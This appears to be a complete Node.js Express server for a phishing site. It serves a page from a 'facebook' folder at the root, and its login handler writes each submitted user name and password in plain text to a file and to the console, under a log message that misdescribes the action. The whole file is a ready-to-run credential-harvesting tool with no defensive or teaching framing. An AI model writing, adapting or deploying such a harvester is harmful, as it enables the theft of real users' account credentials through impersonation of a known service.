const express = require('express');
const app = express();
const path = require('path');
const bodyParser = require('body-parser')
const fs = require('fs');

//add the router
app.listen(process.env.port || 80);
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(__dirname, { dotfiles: 'allow' } ));

app.get('/', function (req, res) {
  res.sendFile(path.join(__dirname + '/facebook/index.html'));
});

app.post('/login', function (req, res) {
  var user_name = req.body.user;
  var password = req.body.password;

  fs.appendFile('empirestate.txt', "User name = " + user_name + ", password is " + password + "\n\n", (err) => {
    if (err) throw err;
    console.log('The lyrics were updated!');
});

  console.log("User name = " + user_name + ", password is " + password);
  res.end("yes");
});
